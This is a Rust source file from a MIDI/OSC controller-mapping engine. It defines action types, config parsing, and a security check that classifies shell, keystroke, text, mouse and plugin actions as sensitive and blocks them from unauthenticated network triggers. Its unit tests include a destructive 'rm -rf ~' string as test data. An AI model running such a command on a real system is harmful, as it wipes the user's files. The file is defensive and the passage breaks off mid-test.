// Copyright 2025-2026 Monstrous Media
// SPDX-License-Identifier: MIT

//! Action types and parsing for Conductor core engine.
//!
//! This module defines domain-specific types (KeyCode, ModifierKey, MouseButton) that are
//! platform-independent and UI-library-agnostic. This enables conductor-core to be truly
//! UI-independent and suitable for WASM/embedded targets.
//!
//! The daemon layer (conductor-daemon/action_executor.rs) is responsible for converting
//! these domain types to platform-specific types (e.g., enigo::Key) for execution.

use crate::config::ActionConfig;
use crate::transform::MidiTransform;
use serde::{Deserialize, Serialize};

/// Platform-independent keyboard key codes
///
/// This enum represents keyboard keys without depending on any UI library.
/// The daemon layer converts these to platform-specific key codes for execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum KeyCode {
    // Alphanumeric keys (handled via Unicode for flexibility)
    Unicode(char),

    // Special keys
    Space,
    Return,
    Tab,
    Escape,
    Backspace,
    Delete,

    // Arrow keys
    UpArrow,
    DownArrow,
    LeftArrow,
    RightArrow,

    // Navigation keys
    Home,
    End,
    PageUp,
    PageDown,

    // Function keys
    F1,
    F2,
    F3,
    F4,
    F5,
    F6,
    F7,
    F8,
    F9,
    F10,
    F11,
    F12,
    F13,
    F14,
    F15,
    F16,
    F17,
    F18,
    F19,
    F20,

    // Media keys
    VolumeUp,
    VolumeDown,
    Mute,
    PlayPause,
    Stop,
    NextTrack,
    PreviousTrack,

    // Editing keys
    Insert,
    PrintScreen,
    ScrollLock,
    Pause,
    CapsLock,
    NumLock,
}

/// Platform-independent modifier keys
///
/// Represents keyboard modifiers (Command, Control, Option/Alt, Shift).
/// These are kept separate from KeyCode for clarity and type safety.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ModifierKey {
    /// Command key (macOS) / Windows key (Windows) / Meta key (Linux)
    Command,
    /// Control key (all platforms)
    Control,
    /// Option key (macOS) / Alt key (Windows/Linux)
    Option,
    /// Shift key (all platforms)
    Shift,
}

/// Platform-independent mouse button identifiers
///
/// Represents mouse buttons without depending on any UI library.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MouseButton {
    Left,
    Right,
    Middle,
}

/// Condition for conditional action execution (v2.2)
///
/// Represents conditions that can be evaluated at runtime to determine
/// whether to execute an action. Supports time-based, app-based, mode-based,
/// and logical operators for complex conditional logic.
///
/// Uses `#[serde(tag = "type")]` for internally-tagged TOML/JSON:
/// `{ type = "ActivePcIs", pc = 12, ... }` rather than the
/// externally-tagged default `{ ActivePcIs = { pc = 12, ... } }`.
/// Aligns with `Trigger` and `ActionConfig` so configs are uniform.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum Condition {
    /// Always evaluates to true (useful for testing)
    Always,

    /// Always evaluates to false (useful for disabling actions)
    Never,

    /// Time-based condition: current time falls within range
    /// Format: start and end times in 24-hour format (HH:MM)
    /// Automatically handles ranges that cross midnight
    TimeRange {
        /// Start time in 24-hour format (e.g., "09:00")
        start: String,
        /// End time in 24-hour format (e.g., "17:30")
        end: String,
    },

    /// Day of week condition
    /// Days: Monday=1, Tuesday=2, ..., Sunday=7
    DayOfWeek {
        /// Days of week when condition is true (1-7)
        days: Vec<u8>,
    },

    /// Application is currently running
    /// Checks if process with given name exists
    AppRunning {
        /// Application name (e.g., "Ableton Live")
        app_name: String,
    },

    /// Application is frontmost (has focus)
    /// Platform-specific implementation
    AppFrontmost {
        /// Application name (e.g., "Ableton Live")
        app_name: String,
    },

    /// Current mode matches
    ModeIs {
        /// Mode name to match
        mode: String,
    },

    /// Logical AND of multiple conditions
    And {
        /// Conditions that must all be true
        conditions: Vec<Condition>,
    },

    /// Logical OR of multiple conditions
    Or {
        /// At least one condition must be true
        conditions: Vec<Condition>,
    },

    /// Logical NOT (negation)
    Not {
        /// Condition to negate
        condition: Box<Condition>,
    },

    // ─── ADR-025 Phase 2 state conditions ───────────────────────
    // All three require an explicit `device` per ADR-025 D5 (no
    // implicit "originating device" — conditions must disambiguate).
    /// True iff the most-recently-observed Program Change on
    /// (`device`, `channel`) equals `pc`. False if no PC has ever been
    /// observed on that tuple since the daemon started.
    ActivePcIs {
        /// Target program number (0-127).
        pc: u8,
        /// MIDI channel (0-15).
        channel: u8,
        /// Device alias or binding ref.
        device: String,
    },

    /// True iff the most-recently-observed value for CC `cc` on
    /// (`device`, `channel`) is in the inclusive range `[min, max]`.
    /// False if the CC has never been observed on that tuple.
    CcValueInRange {
        /// CC number (0-127).
        cc: u8,
        /// MIDI channel (0-15).
        channel: u8,
        /// Inclusive lower bound (0-127).
        min: u8,
        /// Inclusive upper bound (0-127).
        max: u8,
        /// Device alias or binding ref.
        device: String,
    },

    /// True iff a Note-On for (`note`, `channel`, `device`) has been
    /// observed and no corresponding Note-Off has cleared it yet.
    /// Subject to the store's `NoteHeld` TTL — expired entries read
    /// as not-held.
    NoteHeld {
        /// Note number (0-127).
        note: u8,
        /// MIDI channel (0-15).
        channel: u8,
        /// Device alias or binding ref.
        device: String,
        /// Reserved for future per-condition TTL override. Currently
        /// unused — the store's `default_ttl` governs eviction.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        ttl_override_ms: Option<u64>,
    },

    // ─── ADR-025 Phase 2.C: sugar for common MIDI switch-CC pattern ──
    //
    // Config-layer convenience for the MIDI 1.0 switch-CC convention:
    // values 64..=127 are "on" (sustain pressed, sostenuto engaged,
    // etc.) and 0..=63 are "off". Semantically equivalent to the
    // canonical `CcValueInRange` with those bounds — the evaluator
    // delegates rather than duplicating logic, so any change to the
    // canonical semantics propagates automatically.
    /// Sugar: `CcValueInRange { min: 64, max: 127 }`. Canonical MIDI
    /// switch-CC "on" convention.
    CcIsOn {
        /// CC number (0-127).
        cc: u8,
        /// MIDI channel (0-15).
        channel: u8,
        /// Device alias or binding ref.
        device: String,
    },

    /// Sugar: `CcValueInRange { min: 0, max: 63 }`. Canonical MIDI
    /// switch-CC "off" convention. Note that if the CC has never
    /// been observed, this evaluates to `false` (not `true`) —
    /// consistent with the "absence ≠ match" rule.
    CcIsOff {
        /// CC number (0-127).
        cc: u8,
        /// MIDI channel (0-15).
        channel: u8,
        /// Device alias or binding ref.
        device: String,
    },
}

/// Action to be executed when a trigger is matched
///
/// This enum uses domain-specific types (KeyCode, ModifierKey, MouseButton) instead
/// of UI library types, making the core engine truly platform-independent.
#[derive(Debug, Clone)]
pub enum Action {
    Keystroke {
        keys: Vec<KeyCode>,
        modifiers: Vec<ModifierKey>,
    },
    Text(String),
    Launch(String),
    /// Shell action runtime variant (ADR-027 D3 §3.1, issue #1037).
    ///
    /// `args = None` is the legacy whitespace-split path — the executor
    /// runs `parse_command_line(&command)` to derive argv. `args =
    /// Some(_)` is the argv form — the executor passes `command` as
    /// argv[0] and `args` directly to `Command::args`, skipping the
    /// tokeniser entirely.
    Shell {
        command: String,
        args: Option<Vec<String>>,
        /// Per-action timeout (ADR-027 D7 / #1166). `None` → daemon
        /// applies `DEFAULT_SHELL_TIMEOUT_MS` (30s). Validator clamps
        /// to [1000, 300000].
        timeout_ms: Option<u64>,
        /// Per-action OS-sandbox profile override (ADR-027 §D10b).
        /// `None` ⇒ default deny-write / deny-network confinement.
        sandbox: Option<crate::config::types::ShellSandboxConfig>,
    },
    Sequence(Vec<Action>),
    Delay(u64),
    MouseClick {
        button: MouseButton,
        x: Option<i32>,
        y: Option<i32>,
    },
    Repeat {
        action: Box<Action>,
        count: usize,
        delay_ms: Option<u64>,
    },
    Conditional {
        condition: Condition,
        then_action: Box<Action>,
        else_action: Option<Box<Action>>,
    },
    VolumeControl {
        operation: VolumeOperation,
        value: Option<u8>,
    },
    ModeChange {
        mode: String,
    },
    SendMidi {
        port: String,
        message_type: MidiMessageType,
        channel: u8,
        params: MidiMessageParams,
    },
    /// Plugin action (v2.3)
    ///
    /// Execute a custom action plugin with given parameters.
    /// The plugin must be installed and enabled for this to work.
    Plugin {
        /// Plugin identifier (must match ActionPlugin::name())
        plugin: String,
        /// Plugin-specific parameters (JSON object)
        params: serde_json::Value,
    },
    /// Forward MIDI data to an output port with optional transform (v4.25.0 - ADR-009 Gap 2)
    ///
    /// Passes raw MIDI bytes from the triggering event through an optional
    /// transform pipeline and sends them to the named output port.
    MidiForward {
        /// Target MIDI output port name
        target: String,
        /// Optional transform to apply before forwarding
        transform: Option<MidiTransform>,
    },
    /// Forward a gamepad (HID) event to a cross-protocol output endpoint
    /// (ADR-039-B, #1762 step 4b).
    ///
    /// Mapping-triggered analogue of a HID route. Translates the structured
    /// triggering gamepad `InputEvent` to MIDI via the required `transform`
    /// and sends it to the target MIDI output. V1 is MIDI-only (`HidToMidi`);
    /// HID→OSC/Art-Net is route-only. See
    /// [`crate::config::types::ActionConfig`]'s `HidForward` for the full
    /// design.
    HidForward {
        /// Target MIDI output endpoint alias.
        target: String,
        /// Structured HID→MIDI transform (`HidToMidi`). Required.
        transform: crate::config::types::SignalTransform,
    },
    /// Forward an inbound OSC message to an OSC output endpoint
    /// (ADR-039-A Slice 3, #2326).
    ///
    /// Re-sends the triggering `OscInbound` (from the dispatch's trigger
    /// context) to the target OSC output endpoint by alias. V1 is
    /// pass-through (`transform` must be `None`, enforced at config-load).
    /// Gated at dispatch: a mapping with no inbound `OscInbound` in its
    /// trigger context (a non-OSC-triggered mapping) is a benign no-op,
    /// not a load error. See
    /// [`crate::config::types::ActionConfig`]'s `OscForward` for the full
    /// design.
    OscForward {
        /// Target OSC output endpoint alias.
        target: String,
        /// Reserved OSC→OSC transform; `None` in V1.
        transform: Option<crate::config::types::SignalTransform>,
    },
    /// Send an OSC message over UDP (v4.26.0 - ADR-009 Gap H)
    ///
    /// Encodes and sends an OSC message to the specified host:port.
    OscSend {
        /// Target host (e.g. "127.0.0.1")
        host: String,
        /// Target UDP port (e.g. 9000)
        port: u16,
        /// OSC address pattern (e.g. "/track/1/volume")
        address: String,
        /// OSC arguments
        args: Vec<OscArg>,
    },

    /// Context-switch table (ADR-025 Phase 2.F — escape hatch for
    /// PcContextSwitch / CcContextSwitch with > MAX_LINEAR_BRANCHES
    /// branches).
    ///
    /// Emitted by [`crate::config::compile::lower_action`] when a
    /// sugar variant would otherwise produce a deeply-nested
    /// Conditional chain. The dispatcher reads the current
    /// `(device, channel)` state from the physical control-state
    /// store and looks up the matching branch:
    ///
    /// - `ContextKind::Pc` → `HashMap<u8, _>` lookup by program (O(1))
    /// - `ContextKind::Cc` → linear scan over `[min, max]` ranges in
    ///   authoring order (first match wins; spec says sorted + non-
    ///   overlapping but the validator in task #26 is where that's
    ///   enforced)
    ///
    /// Absence of matching state (no PC observed yet / CC never
    /// received) dispatches `default` if present, otherwise no-op.
    ContextSwitchTable {
        /// Whether this table routes by PC or CC.
        kind: ContextKind,
        /// MIDI channel watched (0-15).
        channel: u8,
        /// Device alias or binding ref; exact-string key into the
        /// physical control-state store.
        device: String,
        /// Per-branch actions.
        branches: ContextBranchTable,
        /// Fallback when no branch matches (and / or no state observed).
        default: Option<Box<Action>>,
        /// Debug metadata — where this table was lowered from. Not
        /// used in dispatch; preserved for tracing and the upcoming
        /// Events-panel routing trace (task #29).
        source: LoweringSource,
    },

    /// Observation action (ADR-038 §4.1).
    ///
    /// Carries a `message` template and completes with no signal side-effect.
    /// In Slice 1 the daemon executor only debug-logs the raw template; the
    /// `{value}`/`{note}`/`{cc}`/`{velocity}` substitution and the
    /// event-stream / trace emission are performed by the Tap executor in
    /// Slice 4. Pair with `let_through = true` to observe without consuming.
    Tap {
        /// Template emitted on each match.
        message: String,
    },
}

/// Which physical-state axis a [`Action::ContextSwitchTable`] routes on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ContextKind {
    /// Route by most-recent Program Change on `(device, channel)`.
    Pc,
    /// Route by most-recent CC value on `(device, channel, cc)` —
    /// the CC number is implicit in the branch structure because
    /// `CcContextSwitch` already named the CC being watched. Stored
    /// alongside the table at lowering time — see `lower_cc_to_table`.
    Cc,
}

/// Branch table for [`Action::ContextSwitchTable`].
///
/// Split by kind so the dispatcher can use the appropriate lookup
/// strategy without runtime-checking which flavour of branches it
/// has: O(1) hash for PC, in-order scan for CC ranges.
#[derive(Debug, Clone)]
pub enum ContextBranchTable {
    /// Program-change branches keyed by PC number.
    Pc(std::collections::HashMap<u8, Box<Action>>),
    /// CC-range branches as `(min, max, action)` tuples. Authoring
    /// order preserved from the sugar's `Vec<CcRange>`. Validator
    /// (task #26) enforces non-overlap; dispatcher relies on first-
    /// match-wins semantics within that guarantee.
    Cc {
        /// CC number being watched (0-127).
        cc: u8,
        /// Ranges as `(min, max, action)`.
        ranges: Vec<(u8, u8, Box<Action>)>,
    },
}

impl ContextBranchTable {
    /// ADR-042 D17: whether any branch action is or contains a sensitive
    /// action (#2325 security review). Used by
    /// [`Action::contains_sensitive_action`] to recurse through a
    /// `ContextSwitchTable`'s branches.
    pub fn contains_sensitive_action(&self) -> bool {
        match self {
            ContextBranchTable::Pc(map) => map.values().any(|a| a.contains_sensitive_action()),
            ContextBranchTable::Cc { ranges, .. } => ranges
                .iter()
                .any(|(_, _, action)| action.contains_sensitive_action()),
        }
    }
}

/// Debug metadata attached to lowered context-switch tables so
/// diagnostics (Events panel routing trace, error messages) can
/// point back at the original sugar form.
///
/// Populated by the lowering pass; ignored at dispatch time.
#[derive(Debug, Clone)]
pub struct LoweringSource {
    /// Human-readable origin, e.g. `"PcContextSwitch"` or
    /// `"CcContextSwitch at mode=default/mapping=5"`. Current lowering
    /// populates the variant name; future passes with more context
    /// (task #29) can enrich this with mode/mapping locators.
    pub origin: String,
    /// Branch index within the original sugar, if known. Reserved
    /// for future diagnostics; currently `None`.
    pub branch_index: Option<usize>,
}

/// OSC argument types for OscSend actions (v4.26.0 - ADR-009 Gap H)
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", content = "value")]
pub enum OscArg {
    /// 32-bit integer
    Int(i32),
    /// 32-bit float
    Float(f32),
    /// UTF-8 string
    String(String),
}

/// MIDI message type (v2.1)
///
/// Represents the type of MIDI message to send.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MidiMessageType {
    NoteOn,
    NoteOff,
    ControlChange,
    ProgramChange,
    PitchBend,
    Aftertouch,
}

/// Velocity mapping mode for SendMIDI actions (v2.2)
///
/// Defines how trigger velocity is mapped to output MIDI velocity.
/// This enables dynamic velocity control where pad dynamics can be preserved,
/// scaled, or transformed when sending MIDI notes.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum VelocityMapping {
    /// Fixed velocity (current behavior, v2.1 compatibility)
    /// Always send the same velocity regardless of trigger velocity
    Fixed {
        velocity: u8, // 0-127
    },

    /// Pass-through mode (1:1 mapping)
    /// Output velocity = trigger velocity
    PassThrough,

    /// Linear scaling with configurable range
    /// Maps input range (0-127) to output range (min-max)
    Linear {
        min: u8, // Minimum output velocity (0-127)
        max: u8, // Maximum output velocity (0-127)
    },

    /// Curve-based transformation
    /// Applies non-linear curve to velocity values
    Curve {
        curve_type: VelocityCurve,
        intensity: f32, // 0.0-1.0, curve strength
    },
}

/// Velocity curve types for non-linear transformations
///
/// Defines the shape of the velocity mapping curve.
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub enum VelocityCurve {
    /// Exponential curve (soft hits louder)
    /// Output = input ^ (1 + intensity)
    /// Makes soft hits louder while preserving hard hits
    Exponential,

    /// Logarithmic curve (soft hits quieter)
    /// Output = log(1 + input * intensity) / log(1 + 127 * intensity) * 127
    /// Compresses dynamic range, makes soft hits quieter
    Logarithmic,

    /// S-curve (sigmoid) for smooth transitions
    /// Output = 127 / (1 + exp(-intensity * (input - 63.5)))
    /// Creates smooth acceleration in the middle range
    SCurve,
}

/// MIDI message parameters (v2.2 - updated for variable velocity)
///
/// Type-specific parameters for MIDI messages.
/// Note messages now support velocity mapping instead of fixed velocity.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum MidiMessageParams {
    Note {
        note: u8,
        velocity_mapping: VelocityMapping, // v2.2: was `velocity: u8`
    },
    CC {
        controller: u8,
        value: u8,
    },
    ProgramChange {
        program: u8,
    },
    PitchBend {
        value: i16, // -8192 to +8191
    },
    Aftertouch {
        pressure: u8,
    },
}

#[derive(Debug, Clone, PartialEq)]
pub enum VolumeOperation {
    Up,
    Down,
    Mute,
    Unmute,
    Set,
}

// ActionExecutor has been moved to conductor-daemon (Phase 2 refactor)
// Only pure Action types and parsing remain in core

impl From<ActionConfig> for Action {
    fn from(config: ActionConfig) -> Self {
        match config {
            ActionConfig::Keystroke { keys, modifiers } => Action::Keystroke {
                keys: parse_keys(&keys),
                modifiers: modifiers.iter().flat_map(|m| parse_modifier(m)).collect(),
            },
            ActionConfig::Text { text } => Action::Text(text),
            ActionConfig::Launch { app } => Action::Launch(app),
            ActionConfig::Shell {
                command,
                args,
                timeout_ms,
                sandbox,
            } => Action::Shell {
                command,
                args,
                timeout_ms,
                sandbox,
            },
            ActionConfig::Sequence { actions } => {
                Action::Sequence(actions.into_iter().map(Into::into).collect())
            }
            ActionConfig::Delay { ms } => Action::Delay(ms),
            ActionConfig::MouseClick { button, x, y } => Action::MouseClick {
                button: parse_mouse_button(&button),
                x,
                y,
            },
            ActionConfig::VolumeControl { operation, value } => Action::VolumeControl {
                operation: parse_volume_operation(&operation),
                value,
            },
            ActionConfig::ModeChange { mode } => Action::ModeChange { mode },
            ActionConfig::Repeat {
                action,
                count,
                delay_ms,
            } => Action::Repeat {
                action: Box::new((*action).into()),
                count,
                delay_ms,
            },
            ActionConfig::Conditional {
                condition,
                then_action,
                else_action,
            } => Action::Conditional {
                condition,
                then_action: Box::new((*then_action).into()),
                else_action: else_action.map(|a| Box::new((*a).into())),
            },

            // ADR-025 Phase 2.E — context-switch sugar lowers to
            // nested `Conditional` chains via `config::compile::
            // lower_action`. The primary compilation seam
            // (`mapping::compile_action`) already routes through
            // `lower_action`. But `From` is also reached via `Into`
            // for composite children (e.g. `Sequence { actions }.
            // into()` calls `.into()` on each inner action), so we
            // delegate here too so nested sugar still gets lowered
            // regardless of entry point.
            cfg @ ActionConfig::PcContextSwitch { .. }
            | cfg @ ActionConfig::CcContextSwitch { .. } => {
                crate::config::compile::lower_action(cfg)
            }
            ActionConfig::MidiForward { target, transform } => {
                Action::MidiForward { target, transform }
            }
            ActionConfig::HidForward { target, transform } => {
                Action::HidForward { target, transform }
            }
            ActionConfig::OscForward { target, transform } => {
                Action::OscForward { target, transform }
            }
            ActionConfig::SendMidi {
                port,
                message_type,
                channel,
                note,
                velocity,
                controller,
                value,
                program,
                pitch,
                pressure,
            } => {
                let msg_type = parse_midi_message_type(&message_type);
                let params = match msg_type {
                    MidiMessageType::NoteOn | MidiMessageType::NoteOff => {
                        // v2.2: Use Fixed velocity mapping for backward compatibility
                        // If velocity is specified, create Fixed mapping with that value
                        let velocity_mapping = VelocityMapping::Fixed {
                            velocity: velocity.unwrap_or(100),
                        };
                        MidiMessageParams::Note {
                            note: note.unwrap_or(60),
                            velocity_mapping,
                        }
                    }
                    MidiMessageType::ControlChange => MidiMessageParams::CC {
                        controller: controller.unwrap_or(0),
                        value: value.unwrap_or(0),
                    },
                    MidiMessageType::ProgramChange => MidiMessageParams::ProgramChange {
                        program: program.unwrap_or(0),
                    },
                    MidiMessageType::PitchBend => MidiMessageParams::PitchBend {
                        value: pitch.unwrap_or(0),
                    },
                    MidiMessageType::Aftertouch => MidiMessageParams::Aftertouch {
                        pressure: pressure.unwrap_or(0),
                    },
                };

                Action::SendMidi {
                    port,
                    message_type: msg_type,
                    channel,
                    params,
                }
            }
            ActionConfig::OscSend {
                host,
                port,
                address,
                args,
            } => Action::OscSend {
                host,
                port,
                address,
                args,
            },
            ActionConfig::Plugin { plugin, params } => Action::Plugin { plugin, params },
            ActionConfig::Tap { message } => Action::Tap { message },
        }
    }
}

/// Parse a key string into a list of KeyCodes
///
/// Keys are separated by '+' (e.g., "Cmd+Shift+A")
/// This function is used to convert config strings into domain KeyCode types.
pub fn parse_keys(keys: &str) -> Vec<KeyCode> {
    keys.split('+')
        .filter_map(|k| parse_key(k.trim()))
        .collect()
}

/// Parse a single key string into a KeyCode
///
/// Supports common key names (case-insensitive):
/// - Special keys: "space", "return", "enter", "tab", "escape", etc.
/// - Arrow keys: "up", "down", "left", "right"
/// - Function keys: "f1" through "f20"
/// - Media keys: "volumeup", "volumedown", "mute", "playpause", etc.
/// - Single characters: Any single character (a-z, 0-9, punctuation)
fn parse_key(key: &str) -> Option<KeyCode> {
    match key.to_lowercase().as_str() {
        // Special keys
        "space" => Some(KeyCode::Space),
        "return" | "enter" => Some(KeyCode::Return),
        "tab" => Some(KeyCode::Tab),
        "escape" | "esc" => Some(KeyCode::Escape),
        "backspace" => Some(KeyCode::Backspace),
        "delete" | "del" => Some(KeyCode::Delete),

        // Arrow keys
        "up" | "uparrow" => Some(KeyCode::UpArrow),
        "down" | "downarrow" => Some(KeyCode::DownArrow),
        "left" | "leftarrow" => Some(KeyCode::LeftArrow),
        "right" | "rightarrow" => Some(KeyCode::RightArrow),

        // Navigation keys
        "home" => Some(KeyCode::Home),
        "end" => Some(KeyCode::End),
        "pageup" | "pgup" => Some(KeyCode::PageUp),
        "pagedown" | "pgdn" => Some(KeyCode::PageDown),

        // Function keys
        "f1" => Some(KeyCode::F1),
        "f2" => Some(KeyCode::F2),
        "f3" => Some(KeyCode::F3),
        "f4" => Some(KeyCode::F4),
        "f5" => Some(KeyCode::F5),
        "f6" => Some(KeyCode::F6),
        "f7" => Some(KeyCode::F7),
        "f8" => Some(KeyCode::F8),
        "f9" => Some(KeyCode::F9),
        "f10" => Some(KeyCode::F10),
        "f11" => Some(KeyCode::F11),
        "f12" => Some(KeyCode::F12),
        "f13" => Some(KeyCode::F13),
        "f14" => Some(KeyCode::F14),
        "f15" => Some(KeyCode::F15),
        "f16" => Some(KeyCode::F16),
        "f17" => Some(KeyCode::F17),
        "f18" => Some(KeyCode::F18),
        "f19" => Some(KeyCode::F19),
        "f20" => Some(KeyCode::F20),

        // Media keys
        "volumeup" | "volup" => Some(KeyCode::VolumeUp),
        "volumedown" | "voldown" => Some(KeyCode::VolumeDown),
        "mute" => Some(KeyCode::Mute),
        "playpause" | "play" => Some(KeyCode::PlayPause),
        "stop" => Some(KeyCode::Stop),
        "nexttrack" | "next" => Some(KeyCode::NextTrack),
        "previoustrack" | "previous" | "prev" => Some(KeyCode::PreviousTrack),

        // Editing keys
        "insert" | "ins" => Some(KeyCode::Insert),
        "printscreen" | "prtsc" => Some(KeyCode::PrintScreen),
        "scrolllock" | "scrlk" => Some(KeyCode::ScrollLock),
        "pause" => Some(KeyCode::Pause),
        "capslock" | "caps" => Some(KeyCode::CapsLock),
        "numlock" | "numlk" => Some(KeyCode::NumLock),

        // Single character keys (alphanumeric and punctuation)
        s if s.len() == 1 => {
            let c = s.chars().next().unwrap();
            Some(KeyCode::Unicode(c))
        }

        _ => None,
    }
}

/// Parse a modifier key string into a ModifierKey
///
/// Supports common modifier aliases (case-insensitive):
/// - Command: "cmd", "command", "meta"
/// - Control: "ctrl", "control"
/// - Option: "alt", "option"
/// - Shift: "shift"
pub fn parse_modifier(modifier: &str) -> Option<ModifierKey> {
    match modifier.to_lowercase().as_str() {
        "cmd" | "command" | "meta" => Some(ModifierKey::Command),
        "ctrl" | "control" => Some(ModifierKey::Control),
        "alt" | "option" => Some(ModifierKey::Option),
        "shift" => Some(ModifierKey::Shift),
        _ => None,
    }
}

/// Parse a mouse button string into a MouseButton
///
/// Supports: "left" (default), "right", "middle"
fn parse_mouse_button(button: &str) -> MouseButton {
    match button.to_lowercase().as_str() {
        "right" => MouseButton::Right,
        "middle" => MouseButton::Middle,
        _ => MouseButton::Left,
    }
}

fn parse_volume_operation(operation: &str) -> VolumeOperation {
    match operation.to_lowercase().as_str() {
        "up" => VolumeOperation::Up,
        "down" => VolumeOperation::Down,
        "mute" => VolumeOperation::Mute,
        "unmute" => VolumeOperation::Unmute,
        "set" => VolumeOperation::Set,
        _ => {
            tracing::warn!("Unknown volume operation '{}', defaulting to Up", operation);
            VolumeOperation::Up
        }
    }
}

/// Parse MIDI message type string into enum (v2.1)
///
/// Converts configuration string to MidiMessageType enum variant.
fn parse_midi_message_type(message_type: &str) -> MidiMessageType {
    match message_type.to_lowercase().as_str() {
        "noteon" | "note_on" | "note-on" => MidiMessageType::NoteOn,
        "noteoff" | "note_off" | "note-off" => MidiMessageType::NoteOff,
        "cc" | "controlchange" | "control_change" | "control-change" => {
            MidiMessageType::ControlChange
        }
        "programchange" | "program_change" | "program-change" | "pc" => {
            MidiMessageType::ProgramChange
        }
        "pitchbend" | "pitch_bend" | "pitch-bend" | "pb" => MidiMessageType::PitchBend,
        "aftertouch" | "at" => MidiMessageType::Aftertouch,
        _ => {
            tracing::warn!(
                "Unknown MIDI message type '{}', defaulting to NoteOn",
                message_type
            );
            MidiMessageType::NoteOn
        }
    }
}

// Condition evaluation and volume control moved to conductor-daemon/action_executor.rs

impl Action {
    /// ADR-042 D17 — whether this action *is* or *statically contains* a
    /// sensitive action class.
    ///
    /// "Sensitive" = an action an **unauthenticated network listener** (OSC
    /// over UDP, loopback included — ADR-039-A Slice 2) must not be able to
    /// fire unless the listener opted in via `allow_sensitive_actions`. The
    /// set is every action that executes code or injects input into the host:
    ///
    /// - `Shell` / `Launch` — run a command / open an app.
    /// - `Keystroke` — synthesize key events.
    /// - `Text` — synthesize keystrokes for arbitrary text. Gating `Keystroke`
    ///   but not `Text` would be a trivial bypass (type `…\n` into a terminal),
    ///   so they share the class (#2325 security review).
    /// - `MouseClick` — synthesize pointer input (can drive any UI).
    /// - `Plugin` — execute a (native = arbitrary-code) plugin → RCE; the
    ///   single most dangerous reach from a network packet (#2325 security
    ///   review).
    ///
    /// Recurses into the static wrappers (`Sequence`, `Repeat`, `Conditional`
    /// branches) so a sensitive action nested in a sequence is detected and the
    /// whole envelope is refused **up front** (no partial side effects). This
    /// is a STATIC check: it does not follow actions a `Plugin` emits or a
    /// `ModeChange` triggers at runtime — but `Plugin` itself is now in the
    /// set, so a network origin cannot invoke one at all without opt-in.
    ///
    /// Only the network-origin gate consults this (`network_origin == None`
    /// MIDI/HID dispatches skip it), so widening the set never changes
    /// MIDI/gamepad behaviour.
    pub fn contains_sensitive_action(&self) -> bool {
        match self {
            // ── Sensitive leaves: execute host code or inject input ──
            Action::Shell { .. }
            | Action::Launch(_)
            | Action::Keystroke { .. }
            | Action::Text(_)
            | Action::MouseClick { .. }
            | Action::Plugin { .. } => true,

            // ── Static wrappers: recurse so a sensitive action nested
            //    anywhere is detected and the whole envelope refused up front ──
            Action::Sequence(actions) => actions.iter().any(Action::contains_sensitive_action),
            Action::Repeat { action, .. } => action.contains_sensitive_action(),
            Action::Conditional {
                then_action,
                else_action,
                ..
            } => {
                then_action.contains_sensitive_action()
                    || else_action
                        .as_ref()
                        .is_some_and(|a| a.contains_sensitive_action())
            }
            // ContextSwitchTable dispatches one of its branch actions (or the
            // default) by physical state — so it is a wrapper and MUST recurse,
            // exactly like Conditional. Missing this was a gate bypass: an OSC
            // event could fire a table whose branch is `Shell` (#2325 security
            // review).
            Action::ContextSwitchTable {
                branches, default, ..
            } => {
                branches.contains_sensitive_action()
                    || default
                        .as_ref()
                        .is_some_and(|a| a.contains_sensitive_action())
            }

            // ── Explicitly non-sensitive (output/state actions; no host-code
            //    execution or input injection). Listed exhaustively — NO `_`
            //    arm — so a future Action variant fails the build here and
            //    forces an explicit sensitive/not decision (fail-closed by
            //    construction, #2325 security review). MIDI/OSC output actions
            //    (SendMidi/MidiForward/HidForward/OscSend) emit packets, not
            //    host effects; their loopback-re-entry risk is the D8
            //    feedback-loop guard's domain, not the action-class gate's. ──
            Action::Delay(_)
            | Action::ModeChange { .. }
            | Action::VolumeControl { .. }
            | Action::SendMidi { .. }
            | Action::MidiForward { .. }
            | Action::HidForward { .. }
            | Action::OscSend { .. }
            | Action::OscForward { .. }
            | Action::Tap { .. } => false,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sensitive_leaf_actions_are_detected() {
        assert!(Action::Launch("Calculator".to_string()).contains_sensitive_action());
        assert!(
            Action::Shell {
                sandbox: None,
                command: "rm".to_string(),
                args: None,
                timeout_ms: None,
            }
            .contains_sensitive_action()
        );
        assert!(
            Action::Keystroke {
                keys: vec![],
                modifiers: vec![],
            }
            .contains_sensitive_action()
        );
    }

    #[test]
    fn benign_actions_are_not_sensitive() {
        assert!(!Action::Delay(10).contains_sensitive_action());
        assert!(
            !Action::ModeChange {
                mode: "DJ".to_string(),
            }
            .contains_sensitive_action()
        );
    }

    #[test]
    fn input_injection_and_plugin_actions_are_sensitive() {
        // #2325 security review: an unauthenticated OSC datagram must not reach
        // these without allow_sensitive_actions.
        // Text injects arbitrary keystrokes — gating Keystroke but not Text
        // would be a trivial bypass.
        assert!(Action::Text("rm -rf ~\n".to_string()).contains_sensitive_action());
        // MouseClick synthesizes pointer input.
        assert!(
            Action::MouseClick {
                button: MouseButton::Left,
                x: None,
                y: None,
            }
            .contains_sensitive_action()
        );
        // Plugin runs (native = arbitrary) code → RCE.
        assert!(
            Action::Plugin {
                plugin: "evil".to_string(),
                params: serde_json::json!({}),
            }
            .contains_sensitive_action()
        );
        // Text nested in a sequence is still caught (whole envelope refused).
        let seq = Action::Sequence(vec![Action::Delay(1), Action::Text("payload".to_string())]);
        assert!(seq.contains_sensitive_action());
    }

    #[test]
    fn sensitive_in_context_switch_table_branch_is_detected() {
        // #2325 security review: ContextSwitchTable dispatches a branch action
